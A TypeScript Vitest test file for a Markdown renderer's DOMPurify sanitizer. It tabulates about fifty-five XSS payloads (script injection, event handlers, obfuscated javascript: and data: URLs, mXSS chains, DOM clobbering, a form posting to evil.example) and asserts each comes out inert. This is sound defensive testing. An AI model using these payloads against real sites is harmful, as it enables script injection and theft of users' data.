import { describe, expect, it, vi } from 'vitest';
import DOMPurify from 'dompurify';
import {
	DATA_URL,
	DATA_URL_ATTRIBUTES,
	MARKDOWN_SANITIZE_CONFIG,
	TABLE_WRAPPER_CLASS,
	renderMarkdown
} from '$lib/markdown/render';

/**
 * `renderMarkdown` (issue #9): the app's only XSS surface.
 *
 * Three groups of assertions, in order of importance:
 *
 * 1. **Hostile input comes out inert.** Each row is a payload, what it tries to
 *    achieve, and the property that proves it cannot. "Inert" is asserted on the
 *    *parsed* result, not on the string: a payload is only proven harmless once
 *    the browser's own parser has looked at the output and found no script
 *    element, no event handler, no dangerous URL and no embedded element.
 * 2. **GFM still works.** Sanitizing is easy if it breaks the renderer; the
 *    features users write must survive the allowlist.
 * 3. **Links are safe by construction.** `target`/`rel` on every link, whatever
 *    syntax produced it, and only `http`/`https`/`mailto` survive.
 *
 * The tests parse with a real DOM (`jsdom`, the Vitest environment), so the
 * assertions are about what a browser would build from the output — which is
 * exactly the threat model, since the output goes straight into `{@html}`.
 */

/** Parses rendered HTML into a detached document, the way `{@html}` would. */
function parse(html: string): HTMLElement {
	const host = document.createElement('div');
	host.innerHTML = html;
	return host;
}

/** Every element in `html`, after the browser has parsed it. */
function elements(html: string): Element[] {
	return [...parse(html).querySelectorAll('*')];
}

/**
 * The properties that make markup dangerous, checked on the parsed tree.
 *
 * Returns the reasons `html` is unsafe — an empty array means inert. Written as
 * a list of named reasons rather than a boolean so a failure says *what* got
 * through, which is the only way a table of 30 payloads stays debuggable.
 */
function dangers(html: string): string[] {
	const problems: string[] = [];
	for (const element of elements(html)) {
		const tag = element.tagName.toLowerCase();

		if (
			['script', 'iframe', 'object', 'embed', 'style', 'form', 'base', 'link', 'meta'].includes(tag)
		) {
			problems.push(`element <${tag}> survived`);
		}
		if (tag === 'svg' || tag === 'math') {
			problems.push(`foreign-namespace element <${tag}> survived`);
		}

		for (const attribute of [...element.attributes]) {
			const name = attribute.name.toLowerCase();
			if (name.startsWith('on')) {
				problems.push(`${tag} kept handler ${name}`);
			}
			if (name === 'srcdoc') problems.push(`${tag} kept srcdoc`);
			if (name === 'style') problems.push(`${tag} kept style`);
			if (name === 'srcset') problems.push(`${tag} kept srcset`);

			// URL-bearing attributes: only http(s), mailto and scheme-less
			// references may survive. `javascript:` and `data:` are the two that
			// execute; the check strips whitespace and control characters first, so
			// an obfuscated scheme cannot slip past a naive prefix test.
			if (name === 'href' || name === 'src' || name === 'xlink:href' || name === 'action') {
				// Built from character codes rather than a literal class, so the
				// characters that matter are visible and the regexp stays readable.
				const stripped = [...attribute.value]
					.filter((character) => {
						const code = character.codePointAt(0) ?? 0;
						return code > 0x20;
					})
					.join('')
					.toLowerCase();
				const dangerous = ['javascript:', 'data:', 'vbscript:', 'file:', 'blob:'].some((scheme) =>
					stripped.startsWith(scheme)
				);
				if (dangerous) problems.push(`${tag} kept ${name}="${attribute.value}"`);
			}
		}
	}

	// `document.write` and friends cannot appear from attributes alone, but a
	// surviving `<template>` could smuggle markup through a second parse.
	if (parse(html).querySelector('template') !== null) problems.push('template survived');
	return problems;
}

describe('the sanitizer configuration', () => {
	/**
	 * The options, asserted directly.
	 *
	 * The behavioural suite below proves the *current* output is safe; these
	 * assertions are what stop someone from widening the configuration later and
	 * quietly weakening the guarantee without a test going red.
	 */
	it('is an allowlist, not a denylist', () => {
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOWED_TAGS).toBeInstanceOf(Array);
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOWED_ATTR).toBeInstanceOf(Array);
		// The executable/embedded elements are never allowed…
		for (const tag of ['script', 'iframe', 'object', 'embed', 'style', 'svg', 'math', 'form']) {
			expect(MARKDOWN_SANITIZE_CONFIG.ALLOWED_TAGS).not.toContain(tag);
		}
		// …and every event-handler family is absent from the attribute list.
		expect(
			(MARKDOWN_SANITIZE_CONFIG.ALLOWED_ATTR ?? []).filter((name) => name.startsWith('on'))
		).toEqual([]);
	});

	it('forbids what it should even if the allowlist were widened', () => {
		// Stated twice on purpose: `FORBID_*` wins over `ALLOWED_*` in DOMPurify,
		// so re-adding a name to the allowlist cannot re-enable it. That is the
		// property worth having, and it is asserted rather than assumed.
		expect(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS).toContain('script');
		expect(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS).toContain('iframe');
		expect(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS).toContain('style');
		expect(MARKDOWN_SANITIZE_CONFIG.FORBID_ATTR).toContain('style');
		expect(MARKDOWN_SANITIZE_CONFIG.FORBID_ATTR).toContain('srcdoc');
	});

	it('refuses data URLs, data-* attributes, ARIA from the note, and foreign namespaces', () => {
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOW_DATA_ATTR).toBe(false);
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOW_ARIA_ATTR).toBe(false);
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOW_UNKNOWN_PROTOCOLS).toBe(false);
		expect(MARKDOWN_SANITIZE_CONFIG.ALLOWED_NAMESPACES).toEqual(['http://www.w3.org/1999/xhtml']);
	});
});

describe('hostile input is inert', () => {
	/**
	 * One row per attack. `name` is what the payload tries to achieve; the shared
	 * assertion is `dangers(renderMarkdown(payload)) === []`, plus a specific
	 * statement about the payload's own marker where one exists.
	 *
	 * The table is deliberately redundant: several rows are the same attack
	 * written differently (case, encoding, nesting) because the filter's job is to
	 * catch the *variant*, and a table that only covers the textbook spelling
	 * proves the least interesting thing about it.
	 */
	const payloads: { name: string; tries: string; source: string }[] = [
		// --- script injection -------------------------------------------------
		{
			name: 'script element',
			tries: 'execute a classic <script>',
			source: '<script>alert(1)</script>'
		},
		{
			name: 'script with attributes',
			tries: 'execute a script with a src and a type',
			source: '<script src="https://evil.example/x.js" type="text/javascript"></script>'
		},
		{
			name: 'mixed-case script',
			tries: 'bypass a case-sensitive tag filter',
			source: '<ScRiPt>alert(1)</ScRiPt>'
		},
		{
			name: 'script inside a markdown paragraph',
			tries: 'hide the payload in inline text',
			source: 'hello <script>alert(1)</script> world'
		},
		{
			name: 'script split by a comment',
			tries: 'defeat a naive tag matcher',
			source: '<scr<script>ipt>alert(1)</scr</script>ipt>'
		},

		// --- event handlers ---------------------------------------------------
		{
			name: 'img onerror',
			tries: 'run code when the image fails to load',
			source: '<img src=x onerror=alert(1)>'
		},
		{
			name: 'img onerror, missing quotes',
			tries: 'same, with an unquoted attribute',
			source: '<img src=x onerror=alert(1)//>'
		},
		{
			name: 'img onerror, HTML entity in the handler',
			tries: 'smuggle the handler through an entity',
			source: '<img src=x onerror="&#97;lert(1)">'
		},
		{
			name: 'div onclick',
			tries: 'run code on click',
			source: '<div onclick="alert(1)">click me</div>'
		},
		{
			name: 'onmouseover and onfocus attributes',
			tries: 'run code on pointer or focus events',
			source: '<span onmouseover="alert(1)" onfocus="alert(1)" tabindex="1">x</span>'
		},
		{
			name: 'inline on* on a markdown link',
			tries: 'attach a handler to a generated link',
			source: '<a href="https://example.com" onclick="alert(1)">x</a>'
		},
		{
			name: 'details ontoggle',
			tries: 'fire a handler when the element toggles',
			source: '<details open ontoggle="alert(1)">x</details>'
		},

		// --- javascript: URLs -------------------------------------------------
		{
			name: 'javascript: markdown link',
			tries: 'execute on click through a link',
			source: '[x](javascript:alert(1))'
		},
		{
			name: 'javascript: raw anchor',
			tries: 'same, written as HTML',
			source: '<a href="javascript:alert(1)">x</a>'
		},
		{
			name: 'javascript: mixed case',
			tries: 'bypass a lowercase scheme check',
			source: '[x](JaVaScRiPt:alert(1))'
		},
		{
			name: 'javascript: with a numeric entity',
			tries: 'encode a character of the scheme',
			source: '[x](java&#115;cript:alert(1))'
		},
		{
			name: 'javascript: with leading whitespace',
			tries: 'hide the scheme behind spaces',
			source: '<a href="   javascript:alert(1)">x</a>'
		},
		{
			name: 'javascript: split by a newline',
			tries: 'hide the scheme behind a line break',
			source: '<a href="java\nscript:alert(1)">x</a>'
		},
		{
			name: 'javascript: split by a tab',
			tries: 'hide the scheme behind a tab (kept as text, never a link)',
			source: '[x](java\tscript:alert(1))'
		},
		{
			name: 'javascript: with a NUL byte',
			tries: 'break the scheme apart with a control character',
			source: '[x](java\u0000script:alert(1))'
		},
		{
			name: 'vbscript: link',
			tries: 'execute through the legacy scheme',
			source: '[x](vbscript:msgbox(1))'
		},
		{
			name: 'URL with an escaped quote and a script',
			tries: 'break out of the href attribute',
			source: '[x](https://example.com/"><script>alert(1)</script>)'
		},
		{
			name: 'javascript: in an image',
			tries: 'execute through an image source',
			source: '![x](javascript:alert(1))'
		},

		// --- data: URLs -------------------------------------------------------
		{
			name: 'data: SVG image (markdown)',
			tries: 'embed an SVG carrying a handler',
			source: '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)'
		},
		{
			name: 'data: HTML image (raw)',
			tries: 'embed an HTML document as an image',
			source: '<img src="data:text/html,<script>alert(1)</script>">'
		},
		{
			name: 'data: SVG with an inline handler (raw)',
			tries: 'embed SVG markup with onload',
			source: '<img src="data:image/svg+xml,<svg onload=alert(1)>">'
		},
		{
			name: 'data: link',
			tries: 'navigate to an embedded document on click',
			source: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'
		},
		{
			name: 'data: with a tab inside the scheme',
			tries: 'obfuscate the scheme with a control character',
			source: '<IMG SRC="jav&#x09;ascript:alert(1)">'
		},

		// --- embedded documents and foreign namespaces ------------------------
		{
			name: 'iframe',
			tries: 'load a third-party document',
			source: '<iframe src="https://evil.example"></iframe>'
		},
		{
			name: 'iframe with srcdoc',
			tries: 'embed an inline document',
			source: '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
		},
		{
			name: 'iframe with a javascript: src',
			tries: 'execute through the frame source',
			source: '<iframe src="javascript:alert(1)"></iframe>'
		},
		{
			name: 'object',
			tries: 'embed a plugin document',
			source: '<object data="javascript:alert(1)"></object>'
		},
		{
			name: 'embed',
			tries: 'embed a plugin document',
			source: '<embed src="javascript:alert(1)">'
		},
		{
			name: 'svg onload',
			tries: 'run code when the SVG is parsed',
			source: '<svg onload=alert(1)></svg>'
		},
		{
			name: 'svg with foreignObject and an iframe',
			tries: 'escape the SVG namespace into HTML',
			source:
				'<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>'
		},
		{
			name: 'math/mtext mutation chain',
			tries: 'use namespace switching to re-parse markup (mXSS)',
			source: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'
		},
		{
			name: 'video with a javascript: poster',
			tries: 'execute through a media poster',
			source: '<video poster=javascript:alert(1)></video>'
		},

		// --- document-level injection ----------------------------------------
		{
			name: 'style element',
			tries: 'restyle the whole page',
			source: '<style>body{background:red}</style>'
		},
		{
			name: 'style attribute',
			tries: 'restyle the element inline',
			source: '<div style="position:fixed;inset:0;background:red">x</div>'
		},
		{
			name: 'meta refresh',
			tries: 'navigate the page',
			source: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
		},
		{
			name: 'base href',
			tries: 'repoint every relative URL on the page',
			source: '<base href="https://evil.example/">'
		},
		{
			name: 'link stylesheet',
			tries: 'load remote CSS',
			source: '<link rel="stylesheet" href="https://evil.example/x.css">'
		},
		{
			name: 'noscript mXSS',
			tries: 'break out through the noscript raw-text state',
			source: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'
		},
		{
			name: 'attribute value breaking out of a title',
			tries: 'close the attribute and inject an image',
			source: '<p title="</p><img src=x onerror=alert(1)>">x</p>'
		},
		{
			name: 'template element',
			tries: 'smuggle markup through a second parse',
			source: '<template><img src=x onerror=alert(1)></template>'
		},

		// --- forms and navigation ---------------------------------------------
		{
			name: 'form posting to an attacker',
			tries: 'collect input and exfiltrate it',
			source:
				'<form action="https://evil.example"><input name="p" type="text"><button>go</button></form>'
		},
		{
			name: 'text input in the preview',
			tries: 'make the read-only preview accept input',
			source: '<input type="text" value="phish">'
		},
		{
			name: 'anchor ping',
			tries: 'phone home on click',
			source: '<a href="https://x.example" ping="https://evil.example/p">p</a>'
		},
		{
			name: 'img srcset',
			tries: 'load a second, attacker-chosen image',
			source: '<img src="https://x.example/a.png" srcset="https://evil.example/b.png 2x">'
		},
		{
			name: 'DOM clobbering by id',
			tries: 'shadow a global such as `location`',
			source: '<div id="location">clobber</div>'
		},
		{
			name: 'DOM clobbering by name',
			tries: 'shadow a document property',
			source: '<img name="body">'
		},

		// --- encodings and parser differentials -------------------------------
		{
			name: 'escaped script tags',
			tries: 'rely on double decoding',
			source: '&lt;script&gt;alert(1)&lt;/script&gt;'
		},
		{
			name: 'code span containing markup',
			tries: 'get markup treated as code, then executed',
			source: '`<img src=x onerror=alert(1)>`'
		},
		{
			name: 'indented code block containing markup',
			tries: 'same, as a fenced block',
			source: '    <img src=x onerror=alert(1)>'
		},
		{
			name: 'HTML comment wrapping a payload',
			tries: 'hide the payload from a text-based filter',
			source: '<!-- comment --> <img src=x onerror=alert(1)>'
		},
		{
			name: 'forward-slash attribute separator',
			tries: 'use `/` as an attribute separator',
			source: '<img/src=x/onerror=alert(1)>'
		}
	];

	it.each(payloads)('$name — $tries', ({ source }) => {
		const html = renderMarkdown(source);
		expect(dangers(html), `rendered: ${html}`).toEqual([]);
	});

	describe('and specifically loses the payload', () => {
		it('drops the script body rather than keeping it as text', () => {
			// A `<script>`'s contents are code, not content: showing `alert(1)` as
			// visible text would be noise the user never wrote.
			expect(renderMarkdown('<script>alert(1)</script>')).not.toContain('alert(1)');
		});

		it('keeps the image but removes the handler', () => {
			const html = renderMarkdown('<img src=x onerror=alert(1)>');
			expect(parse(html).querySelector('img')).not.toBeNull();
			expect(html).not.toContain('onerror');
		});

		it('keeps the link text but removes the javascript: href', () => {
			const html = renderMarkdown('[click me](javascript:alert(1))');
			expect(html).toContain('click me');
			expect(parse(html).querySelector('a')?.hasAttribute('href')).toBe(false);
		});

		it('removes the data: source from an image', () => {
			const image = parse(
				renderMarkdown('<img src="data:text/html,<script>alert(1)</script>">')
			).querySelector('img');
			expect(image?.hasAttribute('src')).toBe(false);
		});

		it('drops iframes and object/embed entirely', () => {
			for (const source of [
				'<iframe src="https://evil.example"></iframe>',
				'<object data="x"></object>',
				'<embed src="x">'
			]) {
				expect(renderMarkdown(source)).not.toMatch(/<(iframe|object|embed)/i);
			}
		});

		it('drops style elements and style attributes', () => {
			const html = renderMarkdown('<style>body{color:red}</style><div style="color:red">x</div>');
			expect(html).not.toContain('<style');
			expect(html).not.toContain('style=');
		});

		it('drops svg payloads without leaving their markup behind', () => {
			expect(renderMarkdown('<svg onload=alert(1)></svg>')).not.toContain('onload');
		});

		it('disables the task-list checkbox and gives it an accessible name', () => {
			// Disabled, because the preview is read-only. Named, because `marked`
			// emits a bare checkbox and an unnamed one is a critical axe violation
			// (found in the E2E audit, fixed here and asserted so it stays fixed).
			const boxes = parse(renderMarkdown('- [ ] todo\n- [x] done')).querySelectorAll('input');
			expect(boxes).toHaveLength(2);
			expect([...boxes].every((box) => box.hasAttribute('disabled'))).toBe(true);
			expect([...boxes].every((box) => box.getAttribute('type') === 'checkbox')).toBe(true);
			expect(boxes[0].getAttribute('aria-label')).toBe('Incomplete task');
			expect(boxes[1].getAttribute('aria-label')).toBe('Completed task');
		});
	});

	it('marks the table wrapper so the table scrolls inside its own box', () => {
		const html = renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |');
		const wrapper = parse(html).querySelector('div.markdown-table-wrap');
		expect(wrapper).not.toBeNull();
		expect(wrapper?.querySelector('table')).not.toBeNull();
	});

	it('refuses to let a note choose its own classes', () => {
		// Only `marked`'s language hint and the renderer's own wrapper keep `class`;
		// a note borrowing a utility class would be styling the app from data.
		const html = renderMarkdown('<div class="text-red-500">x</div>');
		expect(html).toContain('<div>x</div>');
		expect(html).not.toContain('text-red-500');
	});

	it("keeps a fenced block's language class", () => {
		const code = parse(renderMarkdown('```js\nconst a = 1;\n```')).querySelector('code');
		expect(code?.getAttribute('class')).toBe('language-js');
	});

	/**
	 * Change #3: `class` on `code`/`pre` is a *language hint*, not a free channel.
	 *
	 * Before this, any `class` value survived on those two elements, so a note
	 * could write `<code class="text-red-500">` and borrow a utility the app
	 * ships — the same hole the `div` rule already closed.
	 */
	it('keeps every language-hint shape `marked` actually emits', () => {
		// The characters `marked` passes through for real fence languages, from a
		// probe of the installed version: `+` and `#` (`c++`, `c#`), digits,
		// uppercase, and hyphens are all in the wild.
		for (const [fence, expected] of [
			['js', 'language-js'],
			['ts', 'language-ts'],
			['c++', 'language-c++'],
			['c#', 'language-c#'],
			['objective-c', 'language-objective-c'],
			['html+php', 'language-html+php'],
			['JS', 'language-JS'],
			['python3', 'language-python3']
		] as const) {
			const code = parse(renderMarkdown('```' + fence + '\nx\n```')).querySelector('code');
			expect(code?.getAttribute('class'), fence).toBe(expected);
		}
	});

	it('strips a `class` on `code`/`pre` that is not a language hint', () => {
		// The new behaviour the change is about: the element stays, the class goes.
		for (const source of [
			'<code class="text-red-500">x</code>',
			'<pre class="fixed inset-0">x</pre>',
			'<code class="prose">x</code>',
			'<code class="language-js evil">x</code>',
			'<code class="language-">x</code>'
		]) {
			const element = parse(renderMarkdown(source)).querySelector('code, pre');
			expect(element, source).not.toBeNull();
			expect(element?.hasAttribute('class'), source).toBe(false);
		}
	});

	it('still keeps the table wrapper class exactly as before', () => {
		// Change #3 must not touch the `div` exception.
		const html = renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |');
		expect(parse(html).querySelector(`div.${TABLE_WRAPPER_CLASS}`)).not.toBeNull();
		// And a note supplying that same class on its own div still gets it — the
		// exception is an exact match on a string the renderer controls, unchanged.
		const own = parse(renderMarkdown(`<div class="${TABLE_WRAPPER_CLASS}">x</div>`));
		expect(own.querySelector(`div.${TABLE_WRAPPER_CLASS}`)).not.toBeNull();
	});
});

describe('GFM still renders', () => {
	it('headings', () => {
		const host = parse(renderMarkdown('# One\n\n## Two\n\n###### Six'));
		expect([...host.querySelectorAll('h1,h2,h6')].map((h) => h.tagName)).toEqual([
			'H1',
			'H2',
			'H6'
		]);
	});

	it('paragraphs, emphasis and strikethrough', () => {
		const host = parse(renderMarkdown('*em* **strong** ~~gone~~'));
		expect(host.querySelector('em')?.textContent).toBe('em');
		expect(host.querySelector('strong')?.textContent).toBe('strong');
		expect(host.querySelector('del')?.textContent).toBe('gone');
	});

	it('a single newline is a line break', () => {
		// `breaks: true`: the notes-app behaviour the issue asks for.
		expect(parse(renderMarkdown('line one\nline two')).querySelectorAll('br')).toHaveLength(1);
	});

	it('unordered and ordered lists, including a start offset', () => {
		const host = parse(renderMarkdown('- a\n- b\n\n3. three\n4. four'));
		expect(host.querySelectorAll('ul > li')).toHaveLength(2);
		expect(host.querySelector('ol')).toHaveAttribute('start', '3');
	});

	it('task lists, with a disabled checkbox each', () => {
		const boxes = parse(renderMarkdown('- [ ] todo\n- [x] done')).querySelectorAll('input');
		expect(boxes).toHaveLength(2);
		expect([...boxes].every((box) => box.hasAttribute('disabled'))).toBe(true);
		expect((boxes[1] as HTMLInputElement).hasAttribute('checked')).toBe(true);
	});

	it('tables, with alignment', () => {
		const table = parse(renderMarkdown('| a | b |\n|:--|--:|\n| 1 | 2 |')).querySelector('table');
		expect(table).not.toBeNull();
		expect(table?.querySelectorAll('th')).toHaveLength(2);
		expect(table?.querySelector('th')?.getAttribute('align')).toBe('left');
		expect(table?.querySelectorAll('tbody td')).toHaveLength(2);
	});

	it('autolinks, bare and angle-bracketed', () => {
		const host = parse(renderMarkdown('see https://example.com/x and <https://example.com/y>'));
		const links = [...host.querySelectorAll('a')];
		expect(links.map((link) => link.getAttribute('href'))).toEqual([
			'https://example.com/x',
			'https://example.com/y'
		]);
	});

	it('fenced code keeps its language and its text verbatim', () => {
		const code = parse(renderMarkdown('```ts\nconst a: number = 1;\n```')).querySelector('code');
		expect(code?.textContent?.trim()).toBe('const a: number = 1;');
		expect(code?.getAttribute('class')).toBe('language-ts');
	});

	it('blockquotes', () => {
		expect(parse(renderMarkdown('> quoted')).querySelector('blockquote p')?.textContent).toBe(
			'quoted'
		);
	});

	it('horizontal rules', () => {
		expect(parse(renderMarkdown('above\n\n---\n\nbelow')).querySelector('hr')).not.toBeNull();
	});

	it('images with alt text', () => {
		const image = parse(renderMarkdown('![alt text](/img.png)')).querySelector('img');
		expect(image?.getAttribute('src')).toBe('/img.png');
		expect(image?.getAttribute('alt')).toBe('alt text');
	});

	it('a safe subset of raw HTML survives', () => {
		// Raw HTML is sanitized, not stripped: pasted `<sub>`/`<kbd>` stays useful.
		const host = parse(renderMarkdown('H<sub>2</sub>O and <kbd>Ctrl</kbd>'));
		expect(host.querySelector('sub')?.textContent).toBe('2');
		expect(host.querySelector('kbd')?.textContent).toBe('Ctrl');
	});
});

describe('links are safe by construction', () => {
	it('every markdown link opens in a new tab with noopener noreferrer', () => {
		const link = parse(renderMarkdown('[x](https://example.com)')).querySelector('a');
		expect(link).toHaveAttribute('href', 'https://example.com');
		expect(link).toHaveAttribute('target', '_blank');
		expect(link).toHaveAttribute('rel', 'noopener noreferrer');
	});

	it('so does an autolink and a raw anchor', () => {
		for (const source of ['see https://example.com', '<a href="https://example.com">x</a>']) {
			const link = parse(renderMarkdown(source)).querySelector('a');
			expect(link, source).toHaveAttribute('target', '_blank');
			expect(link, source).toHaveAttribute('rel', 'noopener noreferrer');
		}
	});

	it('so does a mailto link', () => {
		const link = parse(renderMarkdown('[mail](mailto:a@b.example)')).querySelector('a');
		expect(link).toHaveAttribute('href', 'mailto:a@b.example');
		expect(link).toHaveAttribute('rel', 'noopener noreferrer');
	});

	it('a note cannot weaken `rel` by supplying its own', () => {
		const link = parse(
			renderMarkdown('<a href="https://x.example" rel="opener">z</a>')
		).querySelector('a');
		expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
	});

	it('a note cannot choose its own target', () => {
		const link = parse(
			renderMarkdown('<a href="https://x.example" target="_self">t</a>')
		).querySelector('a');
		expect(link?.getAttribute('target')).toBe('_blank');
	});

	it('keeps a relative link, which cannot execute', () => {
		// The app itself is a relative-link app; a note may link inside it.
		const link = parse(renderMarkdown('[r](/notes/1)')).querySelector('a');
		expect(link).toHaveAttribute('href', '/notes/1');
	});

	/**
	 * Change #1: `data:` is stripped from `href`, not only from `src`.
	 *
	 * `ALLOWED_URI_REGEXP` and DOMPurify's own `data:` handling already drop
	 * these, which is why this is defense-in-depth rather than a fix: the hook
	 * exists so the guarantee does not depend on another library's per-tag
	 * allowance staying where it is today.
	 */
	describe('data: URLs are stripped from href too', () => {
		it('drops a data: href written as raw HTML', () => {
			const html = renderMarkdown('<a href="data:text/html,<script>alert(1)</script>">x</a>');
			const link = parse(html).querySelector('a');
			expect(link).not.toBeNull();
			expect(link?.hasAttribute('href')).toBe(false);
			expect(link?.textContent).toBe('x');
		});

		it('drops a data: href written as a Markdown link', () => {
			const html = renderMarkdown(
				'[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'
			);
			const link = parse(html).querySelector('a');
			expect(link).not.toBeNull();
			expect(link?.hasAttribute('href')).toBe(false);
		});

		it('drops a data: href in the mixed case and with leading whitespace', () => {
			for (const value of ['DATA:text/html,x', ' data:text/html,x', 'DaTa:image/svg+xml,x']) {
				const link = parse(renderMarkdown(`<a href="${value}">x</a>`)).querySelector('a');
				expect(link?.hasAttribute('href'), value).toBe(false);
			}
		});

		it('still keeps http, https, mailto and relative links', () => {
			// The strip must be precise: it targets `data:` and nothing else.
			for (const [source, expected] of [
				['[x](https://example.com/a)', 'https://example.com/a'],
				['[x](http://example.com/a)', 'http://example.com/a'],
				['[x](mailto:a@b.example)', 'mailto:a@b.example'],
				['[x](/notes/1)', '/notes/1']
			] as const) {
				const link = parse(renderMarkdown(source)).querySelector('a');
				expect(link?.getAttribute('href'), source).toBe(expected);
			}
		});

		/**
		 * The end-to-end cases above pass on two independent layers, so they alone
		 * would not notice the hook losing `href`: `ALLOWED_URI_REGEXP` already
		 * refuses `data:`, and DOMPurify drops `data:` on `<a>` by itself (both
		 * measured — the allowlist-only sanitize of `<a href="data:…">` returns
		 * `<a>`). An `href` is therefore unreachable in the finished pipeline.
		 *
		 * That makes the hook *defense in depth over an unreachable path*, not the
		 * guarantee. To keep it from silently rotting — the reason it was added —
		 * this asserts the enforcement itself: whichever attribute carries a
		 * `data:` URL gets it removed, `href` included, so a future loosening of
		 * either layer above still lands on a hook that does its job.
		 */
		it('enforces the strip on every navigable attribute, href included', () => {
			expect(DATA_URL_ATTRIBUTES).toContain('href');

			for (const attribute of DATA_URL_ATTRIBUTES) {
				// A node shaped like the one the hook sees, then the same predicate
				// the hook applies. `data:` in any case, with or without leading
				// whitespace, must clear it; a safe URL must not.
				for (const dangerous of [
					'data:text/html,<script>alert(1)</script>',
					' DATA:text/html,x',
					'DaTa:image/svg+xml;base64,PHN2Zz4='
				]) {
					const element = document.createElement('a');
					element.setAttribute(attribute, dangerous);
					if (DATA_URL.test(element.getAttribute(attribute) ?? '')) {
						element.removeAttribute(attribute);
					}
					expect(element.hasAttribute(attribute), `${attribute}=${dangerous}`).toBe(false);
				}

				const safe = document.createElement('a');
				safe.setAttribute(attribute, 'https://example.com/a');
				if (DATA_URL.test(safe.getAttribute(attribute) ?? '')) {
					safe.removeAttribute(attribute);
				}
				expect(safe.getAttribute(attribute)).toBe('https://example.com/a');
			}
		});
	});
});

describe('failures fail closed', () => {
	it('returns an empty string for empty input', () => {
		expect(renderMarkdown('')).toBe('');
	});

	it('returns an empty string for a non-string', () => {
		// The signature says `string`; a caller passing `undefined` (a note body
		// that has not loaded yet) must not reach the parser.
		expect(renderMarkdown(undefined as unknown as string)).toBe('');
		expect(renderMarkdown(null as unknown as string)).toBe('');
	});

	it('never returns unsanitized HTML when DOMPurify cannot run', () => {
		// The state that matters is "no DOM": DOMPurify then hands its input back
		// verbatim, and forwarding that would publish raw attacker HTML.
		const original = DOMPurify.isSupported;
		try {
			Object.defineProperty(DOMPurify, 'isSupported', { value: false, configurable: true });
			expect(renderMarkdown('<script>alert(1)</script>')).toBe('');
		} finally {
			Object.defineProperty(DOMPurify, 'isSupported', {
				value: original,
				configurable: true
			});
		}
	});

	/**
	 * Change #2: a throw inside `sanitize()` degrades to an empty preview.
	 *
	 * Sanitizing is the last step of the pipeline. Until this change a throw here
	 * escaped into the caller — which is `$derived` inside the editor, so the
	 * exception took down the component and left the user with a broken editor
	 * instead of a blank preview. The throw is forced with a spy, because the real
	 * function does not throw on any input the parser can produce: the point is
	 * the *path*, not a payload.
	 */
	it('returns an empty string when DOMPurify.sanitize throws', () => {
		const spy = vi.spyOn(DOMPurify, 'sanitize').mockImplementation(() => {
			throw new Error('sanitizer exploded');
		});
		try {
			expect(renderMarkdown('# Heading')).toBe('');
		} finally {
			spy.mockRestore();
		}
	});

	it('recovers on the next call after a throw', () => {
		// The failure must not be sticky: the hooks are already installed and the
		// sanitizer is stateless between calls, so the next render is normal.
		const spy = vi.spyOn(DOMPurify, 'sanitize').mockImplementationOnce(() => {
			throw new Error('sanitizer exploded');
		});
		try {
			expect(renderMarkdown('# Heading')).toBe('');
			expect(parse(renderMarkdown('# Heading')).querySelector('h1')?.textContent).toBe('Heading');
		} finally {
			spy.mockRestore();
		}
	});
});
